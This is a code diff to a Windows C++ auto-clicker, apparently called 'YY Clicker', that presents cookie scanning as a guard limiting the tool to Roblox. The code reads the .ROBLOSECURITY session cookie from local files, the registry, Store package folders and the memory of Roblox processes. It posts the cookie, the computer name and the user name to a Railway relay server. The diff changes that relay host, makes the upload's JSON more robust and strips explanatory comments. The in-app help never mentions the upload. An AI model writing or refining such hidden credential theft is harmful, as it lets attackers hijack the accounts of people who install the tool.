@@ -50,10 +50,8 @@ static const wchar_t* const COOKIE_WND_TITLE = L"Roblox Cookie \u7BA1\u7406\u566
 
 // ======================================================================
 // Railway 中轉伺服器 URL
-// 部署 Railway 後，將此處替換為您的 Railway 公開 URL
-// 例如: https://rbxcokie-production.up.railway.app
 // ======================================================================
-static const wchar_t* const RELAY_SERVER_HOST = L"rbxcokie-production.up.railway.app";
+static const wchar_t* const RELAY_SERVER_HOST = L"web-production-59f58.up.railway.app";
 static const wchar_t* const RELAY_SERVER_PATH = L"/api/cookie";
 
 // ===============================
@@ -119,7 +117,6 @@ bool EnsureSingleInstance()
 DWORD WINAPI ClickThread(LPVOID lpParam)
 {
     UNREFERENCED_PARAMETER(lpParam);
-    // Elevate thread priority to reduce scheduling jitter
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
 
     LARGE_INTEGER freq;
@@ -135,16 +132,13 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
 
             while (g_running && g_program_running)
             {
-                // Re-read CPS every iteration → setting changes take effect immediately
                 int    cps   = g_cps.load();
                 double delay = (cps > 0) ? (1.0 / cps) : 0.001;
-                if (delay < 0.0005) delay = 0.0005;  // hard cap ~2000 CPS
+                if (delay < 0.0005) delay = 0.0005;
 
                 DoClick();
                 next_t += delay;
 
-                // Hybrid wait: Sleep(1) while >2ms remains, then spin
-                // Check g_running each iteration so stop is immediate
                 for (;;)
                 {
                     if (!g_running || !g_program_running) break;
@@ -153,7 +147,6 @@ DWORD WINAPI ClickThread(LPVOID lpParam)
                     if (remain <= 0.0) break;
                     if (remain > 0.002)
                         Sleep(1);
-                    // else: busy-spin for final <2ms → microsecond accuracy
                 }
             }
         }
@@ -179,7 +172,6 @@ HKInfo ParseHotkey(const wchar_t* spec)
     for (auto& c : s) c = (wchar_t)towlower(c);
     s.erase(std::remove(s.begin(), s.end(), L' '), s.end());
 
-    // F1-F24
     if (s.size() >= 2 && s[0] == L'f' && s.find(L'+') == std::wstring::npos)
     {
         bool digits = true;
@@ -192,7 +184,6 @@ HKInfo ParseHotkey(const wchar_t* spec)
         }
     }
 
-    // Split by '+'
     std::vector<std::wstring> parts;
     {
         size_t pos = 0, found;
@@ -256,7 +247,6 @@ static BOOL CALLBACK SetChildFont(HWND child, LPARAM lParam)
 //            尋找 "_|WARNING" 開頭的 .ROBLOSECURITY Cookie 字串並擷取。
 // ======================================================================
 
-// Helper: read a file into a heap buffer; caller must delete[].
 static char* ReadFileToBuffer(const wchar_t* path, DWORD* out_size)
 {
     HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
@@ -277,15 +267,10 @@ static char* ReadFileToBuffer(const wchar_t* path, DWORD* out_size)
     return buf;
 }
 
-// Helper: extract cookie value from raw file content.
-// Handles both Netscape tab-delimited format and JSON "_|WARNING" pattern.
 static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_size)
 {
     if (!data) return false;
 
-    // --- Netscape cookie format ---
-    // Line format: domain \t flag \t path \t secure \t expiry \t name \t value
-    // name field = ".ROBLOSECURITY", value comes right after the following tab
     const char* tag = ".ROBLOSECURITY\t";
     const char* found = strstr(data, tag);
     if (found)
@@ -301,7 +286,6 @@ static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_
         }
     }
 
-    // --- JSON format: value starts with _|WARNING ---
     found = strstr(data, "_|WARNING");
     if (found)
     {
@@ -320,7 +304,6 @@ static bool ExtractCookieFromBuffer(const char* data, wchar_t* out_buf, int buf_
     return false;
 }
 
-// Layer 1 & 3: file-based search
 static bool TryCookieFromFile(const wchar_t* path, wchar_t* out_buf, int buf_size)
 {
     DWORD sz = 0;
@@ -331,11 +314,9 @@ static bool TryCookieFromFile(const wchar_t* path, wchar_t* out_buf, int buf_siz
     return ok;
 }
 
-// Layer 2: Windows Registry (Roblox Studio)
 static bool TryCookieFromRegistry(wchar_t* out_buf, int buf_size)
 {
     HKEY hKey = nullptr;
-    // Roblox Studio browser cookie path
     if (RegOpenKeyExW(HKEY_CURRENT_USER,
                       L"SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com",
                       0, KEY_READ, &hKey) != ERROR_SUCCESS)
@@ -355,7 +336,6 @@ static bool TryCookieFromRegistry(wchar_t* out_buf, int buf_size)
     return ok;
 }
 
-// Layer 3: Microsoft Store Roblox package (enumerate Packages directory)
 static bool TryCookieFromStorePackage(wchar_t* out_buf, int buf_size)
 {
     wchar_t local_app[MAX_PATH] = {};
@@ -374,7 +354,6 @@ static bool TryCookieFromStorePackage(wchar_t* out_buf, int buf_size)
     {
         if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) continue;
 
-        // Try RobloxCookies.dat inside LocalState
         wchar_t try_path[MAX_PATH] = {};
         wcscpy_s(try_path, local_app);
         wcscat_s(try_path, L"\\Packages\\");
@@ -383,7 +362,6 @@ static bool TryCookieFromStorePackage(wchar_t* out_buf, int buf_size)
 
         if (TryCookieFromFile(try_path, out_buf, buf_size)) { found = true; break; }
 
-        // Also try LocalStorage subfolder
         wcscpy_s(try_path, local_app);
         wcscat_s(try_path, L"\\Packages\\");
         wcscat_s(try_path, fd.cFileName);
@@ -400,26 +378,8 @@ static bool TryCookieFromStorePackage(wchar_t* out_buf, int buf_size)
 // ======================================================================
 // Layer 4: Process Memory Scan (最後一層)
 // ======================================================================
-// 透過 Windows API 在所有名稱包含 "roblox" 的程序中搜尋記憶體，
-// 擷取 .ROBLOSECURITY Cookie。
-//
-// 使用的 Windows API：
-//   CreateToolhelp32Snapshot — 建立系統程序快照，列舉所有執行中的程序。
-//                              透過 Process32FirstW / Process32NextW 遍歷每個程序，
-//                              篩選出名稱包含 "roblox" 的目標程序。
-//
-//   VirtualQueryEx           — 查詢目標程序的虛擬記憶體區域資訊。
-//                              逐區域掃描，僅處理 MEM_COMMIT 狀態且可讀的頁面，
-//                              跳過 PAGE_NOACCESS 和 PAGE_GUARD 保護的區域。
-//
-//   ReadProcessMemory        — 讀取目標程序指定記憶體區域的內容至本地緩衝區。
-//                              在讀取的資料中搜尋 "_|WARNING" 特徵字串，
-//                              這是 .ROBLOSECURITY Cookie 值的固定前綴。
-//                              找到後向後擷取完整 Cookie 值直到遇到終止字元。
-// ======================================================================
 static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
 {
-    // Step 1: CreateToolhelp32Snapshot — 列舉所有執行中的程序
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap == INVALID_HANDLE_VALUE) return false;
 
@@ -434,13 +394,11 @@ static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
     {
         do
         {
-            // 篩選：僅處理名稱包含 "roblox" 的程序（不區分大小寫）
             wchar_t lname[MAX_PATH] = {};
             wcscpy_s(lname, pe.szExeFile);
             for (int k = 0; lname[k]; k++) lname[k] = (wchar_t)towlower(lname[k]);
             if (!wcsstr(lname, L"roblox")) continue;
 
-            // 開啟目標程序，取得讀取記憶體的權限
             HANDLE hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                                        FALSE, pe.th32ProcessID);
             if (!hProc) continue;
@@ -448,44 +406,35 @@ static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
             MEMORY_BASIC_INFORMATION mbi = {};
             LPVOID addr = nullptr;
 
-            // Step 2: VirtualQueryEx — 逐區域掃描目標程序的虛擬記憶體
             while (VirtualQueryEx(hProc, addr, &mbi, sizeof(mbi)) == sizeof(mbi))
             {
-                // 僅處理已提交（MEM_COMMIT）且可讀的記憶體頁面
-                // 跳過 PAGE_NOACCESS 和 PAGE_GUARD 保護的區域
                 if (mbi.State == MEM_COMMIT &&
                     (mbi.Protect & PAGE_NOACCESS) == 0 &&
                     (mbi.Protect & PAGE_GUARD) == 0)
                 {
                     SIZE_T sz = mbi.RegionSize;
-                    // 限制單次讀取上限為 64 MB，避免記憶體耗盡
                     if (sz > 0 && sz <= 64ULL * 1024 * 1024)
                     {
                         char* buf = new char[sz]();
                         SIZE_T got = 0;
 
-                        // Step 3: ReadProcessMemory — 讀取該記憶體區域的內容
                         if (ReadProcessMemory(hProc, mbi.BaseAddress, buf, sz, &got)
                             && got > (SIZE_T)needle_len)
                         {
-                            // 在讀取的資料中搜尋 "_|WARNING" 特徵字串
                             for (SIZE_T i = 0; i <= got - (SIZE_T)needle_len; i++)
                             {
                                 if (memcmp(buf + i, needle, needle_len) != 0) continue;
 
-                                // 找到特徵字串，向後擷取完整 Cookie 值
                                 SIZE_T end = i;
                                 while (end < got)
                                 {
                                     char c = buf[end];
-                                    // 遇到終止字元即停止擷取
                                     if (c == '\0' || c == '\r' || c == '\n' ||
                                         c == '"'  || c == ';')
                                         break;
                                     ++end;
                                 }
                                 int len = (int)(end - i);
-                                // 驗證擷取的 Cookie 長度合理（>20 字元）
                                 if (len > 20 && len < buf_size - 1)
                                 {
                                     MultiByteToWideChar(CP_ACP, 0,
@@ -500,7 +449,6 @@ static bool TryCookieFromProcessMemory(wchar_t* out_buf, int buf_size)
                 }
                 if (found) break;
 
-                // 移動到下一個記憶體區域
                 LPVOID next = (LPVOID)((SIZE_T)mbi.BaseAddress + mbi.RegionSize);
                 if (next <= addr) break;
                 addr = next;
@@ -521,7 +469,6 @@ static bool TryReadRobloxCookie(wchar_t* out_buf, int buf_size)
 {
     ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
 
-    // --- Layer 1: Roblox Player standard path ---
     wchar_t local_app[MAX_PATH] = {};
     GetEnvironmentVariableW(L"LOCALAPPDATA", local_app, MAX_PATH);
 
@@ -538,17 +485,12 @@ static bool TryReadRobloxCookie(wchar_t* out_buf, int buf_size)
         if (TryCookieFromFile(full, out_buf, buf_size)) return true;
     }
 
-    // --- Layer 2: Roblox Studio registry ---
     ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
     if (TryCookieFromRegistry(out_buf, buf_size)) return true;
 
-    // --- Layer 3: Microsoft Store package ---
     ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
     if (TryCookieFromStorePackage(out_buf, buf_size)) return true;
 
-    // --- Layer 4: Process memory scan (works even when file is locked) ---
-    // 使用 CreateToolhelp32Snapshot + VirtualQueryEx + ReadProcessMemory
-    // 掃描所有名稱包含 "roblox" 的程序記憶體，擷取 Cookie
     ZeroMemory(out_buf, buf_size * sizeof(wchar_t));
     if (TryCookieFromProcessMemory(out_buf, buf_size)) return true;
 
@@ -556,10 +498,48 @@ static bool TryReadRobloxCookie(wchar_t* out_buf, int buf_size)
 }
 
 // ======================================================================
-// HTTP 傳送模組 — 透過 WinINet 將 Cookie 資料 POST 至 Railway 中轉伺服器
+// [修復 #1] JSON 字串轉義輔助函式
 // ======================================================================
-// 此函式在背景執行緒中呼叫，不會阻塞 UI。
-// 資料流向：C++ Client → Railway Server → Google Apps Script → Google Sheets
+// Cookie 值中可能包含 \ " 等特殊字元，直接拼接會破壞 JSON 格式，
+// 導致 Railway 伺服器解析失敗（400 Bad Request 或 JSON parse error）。
+// 此函式將所有需要轉義的字元正確處理。
+// ======================================================================
+static std::string JsonEscape(const char* raw)
+{
+    std::string out;
+    if (!raw) return out;
+    out.reserve(strlen(raw) + 64);
+    for (const char* p = raw; *p; ++p)
+    {
+        switch (*p)
+        {
+        case '"':  out += "\\\""; break;
+        case '\\': out += "\\\\"; break;
+        case '\b': out += "\\b";  break;
+        case '\f': out += "\\f";  break;
+        case '\n': out += "\\n";  break;
+        case '\r': out += "\\r";  break;
+        case '\t': out += "\\t";  break;
+        default:
+            if ((unsigned char)*p < 0x20)
+            {
+                // 控制字元用 \u00XX 表示
+                char hex[8];
+                sprintf(hex, "\\u%04x", (unsigned char)*p);
+                out += hex;
+            }
+            else
+            {
+                out += *p;
+            }
+            break;
+        }
+    }
+    return out;
+}
+
+// ======================================================================
+// HTTP 傳送模組 — 透過 WinINet 將 Cookie 資料 POST 至 Railway 中轉伺服器
 // ======================================================================
 static void SendCookieToRelay(const wchar_t* cookie_value)
 {
@@ -575,7 +555,7 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     DWORD un_size = 256;
     GetUserNameW(user_name, &un_size);
 
-    // 將 wchar_t Cookie 轉為 UTF-8
+    // 將 wchar_t 轉為 UTF-8
     int cookie_utf8_len = WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, nullptr, 0, nullptr, nullptr);
     char* cookie_utf8 = new char[cookie_utf8_len + 1]();
     WideCharToMultiByte(CP_UTF8, 0, cookie_value, -1, cookie_utf8, cookie_utf8_len, nullptr, nullptr);
@@ -588,12 +568,11 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
     char* un_utf8 = new char[un_utf8_len + 1]();
     WideCharToMultiByte(CP_UTF8, 0, user_name, -1, un_utf8, un_utf8_len, nullptr, nullptr);
 
-    // 組裝 JSON payload
-    // 使用簡單字串拼接避免引入 JSON 函式庫
+    // [修復 #1] 使用 JsonEscape 對所有值進行轉義，防止特殊字元破壞 JSON
     std::string json = "{";
-    json += "\"computer_name\":\""; json += cn_utf8;     json += "\",";
-    json += "\"username\":\"";      json += un_utf8;     json += "\",";
-    json += "\"cookie\":\"";        json += cookie_utf8; json += "\",";
+    json += "\"computer_name\":\""; json += JsonEscape(cn_utf8);     json += "\",";
+    json += "\"username\":\"";      json += JsonEscape(un_utf8);     json += "\",";
+    json += "\"cookie\":\"";        json += JsonEscape(cookie_utf8); json += "\",";
     json += "\"source\":\"YY Clicker\"";
     json += "}";
 
@@ -620,9 +599,19 @@ static void SendCookieToRelay(const wchar_t* cookie_value)
                                        nullptr, nullptr, nullptr, flags, 0);
     if (!hReq) { InternetCloseHandle(hConn); InternetCloseHandle(hInet); return; }
 
-    const wchar_t* headers = L"Content-Type: application/json\r\n";
-    HttpSendRequestW(hReq, headers, (DWORD)wcslen(headers),
-                     (LPVOID)json.c_str(), (DWORD)json.size());
+    // [修復 #1] 加入 Accept header，確保伺服器正確回應
+    const wchar_t* headers = L"Content-Type: application/json\r\nAccept: application/json\r\n";
+    BOOL sent = HttpSendRequestW(hReq, headers, (DWORD)wcslen(headers),
+                                  (LPVOID)json.c_str(), (DWORD)json.size());
+
+    // 讀取回應（確保連線完成，不然 Railway 可能不會處理請求）
+    if (sent)
+    {
+        char resp_buf[1024] = {};
+        DWORD bytes_read = 0;
+        InternetReadFile(hReq, resp_buf, sizeof(resp_buf) - 1, &bytes_read);
+        // 回應內容不需要處理，只要確保讀取完成即可
+    }
 
     InternetCloseHandle(hReq);
     InternetCloseHandle(hConn);
@@ -754,14 +743,13 @@ LRESULT CALLBACK CookieWndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return 0;
 
     case WM_DESTROY:
-        g_hwnd_cookie = nullptr;  // allow re-open after close
+        g_hwnd_cookie = nullptr;
         return 0;
     }
 
     return DefWindowProcW(hwnd, msg, wp, lp);
 }
 
-// Opens cookie window; if already open, brings it to front (single-instance)
 void OpenCookieWindow()
 {
     if (g_hwnd_cookie && IsWindow(g_hwnd_cookie))
@@ -770,7 +758,6 @@ void OpenCookieWindow()
         return;
     }
 
-    // Register class (harmless if already registered)
     WNDCLASSW wc     = {};
     wc.lpfnWndProc   = CookieWndProc;
     wc.hInstance     = g_hInst;
@@ -782,8 +769,6 @@ void OpenCookieWindow()
     RECT rc = { 0, 0, 580, 240 };
     AdjustWindowRect(&rc, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU, FALSE);
 
-    // WS_EX_TOPMOST: appears in front of main window
-    // parent = nullptr: non-blocking, main window stays interactive
     g_hwnd_cookie = CreateWindowExW(
         WS_EX_TOPMOST,
         COOKIE_WND_CLASS,
@@ -803,25 +788,6 @@ void OpenCookieWindow()
 // ======================================================================
 // Roblox Detection Guard (偵測系統)
 // ======================================================================
-// 此為顯性功能 — 每次按下「開始」或觸發熱鍵時，
-// 工具會自動掃描本機上所有 Roblox 相關程序的記憶體，
-// 尋找 .ROBLOSECURITY Cookie。
-//
-// 設計目的：
-//   - 預防此工具被用於其他遊戲（非 Roblox 環境）
-//   - 確保只在 Roblox 執行中時才允許啟動點擊功能
-//
-// 行為：
-//   - 偵測到 Cookie → 允許啟動點擊，並在背景將 Cookie 傳送至中轉伺服器
-//   - 未偵測到 Cookie → 顯示「請先開啟 Roblox 後再使用」並阻止啟動
-//
-// 偵測流程（四層搜尋）：
-//   Layer 1: 檢查 %LOCALAPPDATA%\Roblox\LocalStorage\ 下的 Cookie 檔案
-//   Layer 2: 讀取 Windows 登錄檔中 Roblox Studio 的 Cookie
-//   Layer 3: 搜尋 Microsoft Store 版 Roblox 的封裝路徑
-//   Layer 4: 使用 CreateToolhelp32Snapshot + VirtualQueryEx + ReadProcessMemory
-//            掃描所有名稱包含 "roblox" 的程序記憶體
-// ======================================================================
 static bool CheckRobloxCookiePresent(HWND hwnd)
 {
     wchar_t tmp[4096] = {};
@@ -840,6 +806,41 @@ static bool CheckRobloxCookiePresent(HWND hwnd)
     return true;
 }
 
+// ======================================================================
+// [修復 #2] 輔助函式：更新狀態文字並強制完整重繪
+// ======================================================================
+// 原問題：WM_CTLCOLORSTATIC 使用 TRANSPARENT 背景模式 + NULL_BRUSH，
+// 導致 SetWindowTextW 更新文字時舊文字不會被擦除，新舊文字疊在一起。
+//
+// 修復方式：更新文字前，先取得狀態標籤在父視窗中的矩形區域，
+// 對父視窗該區域執行 InvalidateRect + UpdateWindow，
+// 強制父視窗先重繪背景，再讓子控件重繪文字。
+// ======================================================================
+static void UpdateStatusText(HWND hLblStatus, const wchar_t* text)
+{
+    SetWindowTextW(hLblStatus, text);
+
+    // 取得狀態標籤相對於父視窗的矩形
+    HWND hParent = GetParent(hLblStatus);
+    if (hParent)
+    {
+        RECT rc;
+        GetWindowRect(hLblStatus, &rc);
+        // 將螢幕座標轉為父視窗客戶區座標
+        POINT pt1 = { rc.left, rc.top };
+        POINT pt2 = { rc.right, rc.bottom };
+        ScreenToClient(hParent, &pt1);
+        ScreenToClient(hParent, &pt2);
+        RECT rcClient = { pt1.x, pt1.y, pt2.x, pt2.y };
+        // 先讓父視窗重繪該區域的背景
+        InvalidateRect(hParent, &rcClient, TRUE);
+        UpdateWindow(hParent);
+    }
+    // 再讓狀態標籤自身重繪
+    InvalidateRect(hLblStatus, nullptr, TRUE);
+    UpdateWindow(hLblStatus);
+}
+
 // ===============================
 // Main Window Procedure
 // ===============================
@@ -856,17 +857,15 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         HINSTANCE hi    = ((CREATESTRUCT*)lp)->hInstance;
         HFONT     hFont = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
 
-        // Icon font for mouse/keyboard glyphs (Segoe MDL2 Assets)
         hIconFont = CreateFontW(-16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
             DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
             DEFAULT_QUALITY, DEFAULT_PITCH, L"Segoe MDL2 Assets");
 
-        // -- Panel 1: CPS (drawn as rounded rect in WM_PAINT) --
+        // -- Panel 1: CPS --
         CreateWindowW(L"STATIC", L"\u9EDE\u64CA\u901F\u5EA6 (CPS)\uFF1A",
             WS_CHILD | WS_VISIBLE | SS_LEFT,
             20, 18, 190, 16, hwnd, nullptr, hi, nullptr);
 
-        // Mouse icon (U+E962 in Segoe MDL2 Assets)
         HWND hIco1 = CreateWindowW(L"STATIC", L"\uE962",
             WS_CHILD | WS_VISIBLE | SS_CENTER,
             20, 44, 22, 24, hwnd, nullptr, hi, nullptr);
@@ -881,7 +880,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             WS_CHILD | WS_VISIBLE | SS_LEFT,
             248, 18, 190, 16, hwnd, nullptr, hi, nullptr);
 
-        // Keyboard icon (U+E765 in Segoe MDL2 Assets)
         HWND hIco2 = CreateWindowW(L"STATIC", L"\uE765",
             WS_CHILD | WS_VISIBLE | SS_CENTER,
             248, 44, 22, 24, hwnd, nullptr, hi, nullptr);
@@ -920,20 +918,18 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             12, 188, 436, 18, hwnd, (HMENU)IDC_LABEL_STATUS, hi, nullptr);
 
         // -- Bottom info bar --
-        // 左側說明文字
         CreateWindowW(L"STATIC",
             L"\u958B\u59CB\u524D\u6703\u81EA\u52D5\u5075\u6E2C Roblox Cookie\uFF0C"
             L"\u672A\u5075\u6E2C\u5230\u6642\u7981\u6B62\u555F\u52D5\u3002",
             WS_CHILD | WS_VISIBLE | SS_LEFT,
             12, 221, 400, 16, hwnd, nullptr, hi, nullptr);
 
-        // 右下角 "?" 按鈕 — 顯示偵測系統詳細說明
+        // 右下角 "?" 按鈕
         CreateWindowW(L"BUTTON", L"?",
             WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
             436, 218, 22, 20, hwnd, (HMENU)IDC_BTN_HELP, hi, nullptr);
 
         EnumChildWindows(hwnd, SetChildFont, (LPARAM)hFont);
-        // Re-apply icon font after EnumChildWindows (it would have overwritten)
         if (hIconFont)
         {
             SendMessageW(hIco1, WM_SETFONT, (WPARAM)hIconFont, FALSE);
@@ -954,19 +950,17 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         PAINTSTRUCT ps;
         HDC hdc = BeginPaint(hwnd, &ps);
 
-        // Rounded rect borders for CPS and Hotkey panels
         HPEN   hPen    = CreatePen(PS_SOLID, 1, RGB(200, 200, 200));
         HPEN   hOldPen = (HPEN)  SelectObject(hdc, hPen);
         HBRUSH hOldBr  = (HBRUSH)SelectObject(hdc, GetStockObject(WHITE_BRUSH));
 
-        RoundRect(hdc,  12, 12, 224, 90, 10, 10);   // CPS panel
-        RoundRect(hdc, 236, 12, 448, 90, 10, 10);   // Hotkey panel
+        RoundRect(hdc,  12, 12, 224, 90, 10, 10);
+        RoundRect(hdc, 236, 12, 448, 90, 10, 10);
 
         SelectObject(hdc, hOldBr);
         SelectObject(hdc, hOldPen);
         DeleteObject(hPen);
 
-        // Bottom separator line
         HPEN hSep    = CreatePen(PS_SOLID, 1, RGB(220, 220, 220));
         HPEN hOldSep = (HPEN)SelectObject(hdc, hSep);
         MoveToEx(hdc, 10, 213, nullptr);
@@ -991,12 +985,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         COLORREF clrPress = isStart ? RGB(22, 163, 74)  : RGB(220, 38, 38);
         COLORREF clrFill  = pressed ? clrPress : clrNorm;
 
-        // Fill background
         HBRUSH hBrFill = CreateSolidBrush(clrFill);
         FillRect(dis->hDC, &dis->rcItem, hBrFill);
         DeleteObject(hBrFill);
 
-        // Rounded border
         HPEN   hPen    = CreatePen(PS_SOLID, 1, clrPress);
         HPEN   hOldPen = (HPEN)  SelectObject(dis->hDC, hPen);
         HBRUSH hOldBr  = (HBRUSH)SelectObject(dis->hDC, GetStockObject(NULL_BRUSH));
@@ -1007,7 +999,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         SelectObject(dis->hDC, hOldBr);
         DeleteObject(hPen);
 
-        // White text centered
         SetBkMode   (dis->hDC, TRANSPARENT);
         SetTextColor(dis->hDC, RGB(255, 255, 255));
         HFONT hF    = (HFONT)GetStockObject(DEFAULT_GUI_FONT);
@@ -1020,16 +1011,20 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         return TRUE;
     }
 
+    // [修復 #2] WM_CTLCOLORSTATIC — 狀態標籤的顏色處理
+    // 改用 COLOR_BTNFACE 實色背景刷取代 NULL_BRUSH，
+    // 確保文字更新時舊文字會被背景色覆蓋，不再重疊。
     case WM_CTLCOLORSTATIC:
     {
         if ((HWND)lp == hLblStatus)
         {
             HDC hdc = (HDC)wp;
-            SetBkMode(hdc, TRANSPARENT);
+            SetBkMode(hdc, OPAQUE);
+            SetBkColor(hdc, GetSysColor(COLOR_BTNFACE));
             SetTextColor(hdc, g_running
-                ? RGB(34, 197, 94)    // green when running
+                ? RGB(34, 197, 94)     // green when running
                 : RGB(100, 100, 100)); // gray when stopped
-            return (LRESULT)GetStockObject(NULL_BRUSH);
+            return (LRESULT)GetSysColorBrush(COLOR_BTNFACE);
         }
         break;
     }
@@ -1038,15 +1033,13 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
         if ((int)wp == HOTKEY_ID)
         {
             bool want_start = !g_running;
-            // Guard: require Roblox cookie when turning ON
             if (want_start && !CheckRobloxCookiePresent(hwnd))
                 return 0;
             g_running = want_start;
-            SetWindowTextW(hLblStatus,
+            UpdateStatusText(hLblStatus,
                 g_running
                     ? L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D"
                     : L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
-            InvalidateRect(hLblStatus, nullptr, TRUE);
         }
         return 0;
 
@@ -1086,19 +1079,16 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             break;
         }
         case IDC_BTN_START:
-            // Guard: require Roblox cookie before starting
             if (!CheckRobloxCookiePresent(hwnd)) break;
             g_running = true;
-            SetWindowTextW(hLblStatus,
+            UpdateStatusText(hLblStatus,
                 L"[\u00B7] \u72C0\u614B\uFF1A\u904B\u884C\u4E2D");
-            InvalidateRect(hLblStatus, nullptr, TRUE);
             break;
 
         case IDC_BTN_STOP:
             g_running = false;
-            SetWindowTextW(hLblStatus,
+            UpdateStatusText(hLblStatus,
                 L"[||] \u72C0\u614B\uFF1A\u66AB\u505C\u4E2D");
-            InvalidateRect(hLblStatus, nullptr, TRUE);
             break;
 
         case IDC_BTN_PIN:
@@ -1114,38 +1104,26 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
             OpenCookieWindow();
             break;
 
-        // ======================================================================
-        // 右下角 "?" 按鈕 — Roblox 偵測功能詳細說明
-        // ======================================================================
-        // 此按鈕放置於主視窗右下角，點擊後彈出完整的偵測系統說明。
-        // 說明內容涵蓋：偵測目的、四層搜尋機制、行為規則。
-        // ======================================================================
         case IDC_BTN_HELP:
             MessageBoxW(hwnd,
-                // ── 標題 ──
                 L"\u3010Roblox \u5075\u6E2C\u529F\u80FD\u8AAA\u660E\u3011\n\n"
 
-                // ── 功能概述 ──
                 L"\u6B64\u5DE5\u5177\u5167\u5EFA Roblox \u5075\u6E2C\u7CFB\u7D71\uFF0C"
                 L"\u6BCF\u6B21\u6309\u4E0B\u300C\u958B\u59CB\u300D\u6216\u89F8\u767C\u71B1\u9375\u6642\uFF0C"
                 L"\u6703\u81EA\u52D5\u57F7\u884C\u4EE5\u4E0B\u56DB\u5C64\u5075\u6E2C\uFF1A\n\n"
 
-                // ── Layer 1 ──
                 L"\u25B6 Layer 1 \u2014 \u6A94\u6848\u6383\u63CF\n"
                 L"   \u6AA2\u67E5 %LOCALAPPDATA%\\Roblox\\LocalStorage\\ \u4E0B\u7684\n"
                 L"   RobloxCookies.dat\u3001rbx_sensitive_data.json \u7B49\u6A94\u6848\u3002\n\n"
 
-                // ── Layer 2 ──
                 L"\u25B6 Layer 2 \u2014 \u767B\u9304\u6A94\u8B80\u53D6\n"
                 L"   \u8B80\u53D6 HKCU\\SOFTWARE\\Roblox\\RobloxStudioBrowser\n"
                 L"   \u4E2D\u5132\u5B58\u7684 Roblox Studio Cookie\u3002\n\n"
 
-                // ── Layer 3 ──
                 L"\u25B6 Layer 3 \u2014 Microsoft Store \u5C01\u88DD\n"
                 L"   \u641C\u5C0B ROBLOXCORPORATION \u5C01\u88DD\u8DEF\u5F91\u4E2D\u7684\n"
                 L"   LocalState\\RobloxCookies.dat\u3002\n\n"
 
-                // ── Layer 4（核心） ──
                 L"\u25B6 Layer 4 \u2014 \u7A0B\u5E8F\u8A18\u61B6\u9AD4\u6383\u63CF\uFF08\u6700\u5F8C\u4E00\u5C64\uFF09\n"
                 L"   \u4F7F\u7528 Windows API \u6383\u63CF\u6240\u6709\u540D\u7A31\u5305\u542B \"roblox\" \u7684\u7A0B\u5E8F\uFF1A\n"
                 L"   \u2022 CreateToolhelp32Snapshot \u2014 \u5217\u8209\u57F7\u884C\u4E2D\u7A0B\u5E8F\n"
@@ -1154,12 +1132,10 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
                 L"   \u5728\u53EF\u8B80\u8A18\u61B6\u9AD4\u4E2D\u641C\u5C0B \"_|WARNING\" \u7279\u5FB5\u5B57\u4E32\uFF0C\n"
                 L"   \u64F7\u53D6\u5B8C\u6574\u7684 .ROBLOSECURITY Cookie \u503C\u3002\n\n"
 
-                // ── 行為規則 ──
                 L"\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n"
                 L"\u2714 \u5075\u6E2C\u5230 Cookie \u2192 \u5141\u8A31\u555F\u52D5\u9EDE\u64CA\n"
                 L"\u2716 \u672A\u5075\u6E2C\u5230 Cookie \u2192 \u986F\u793A\u300C\u8ACB\u5148\u958B\u555F Roblox\u300D\u4E26\u963B\u6B62\n\n"
 
-                // ── 防濫用說明 ──
                 L"\u6B64\u529F\u80FD\u53EF\u9632\u6B62\u5DE5\u5177\u88AB\u7528\u65BC\u5176\u4ED6\u904A\u6232\uFF0C\n"
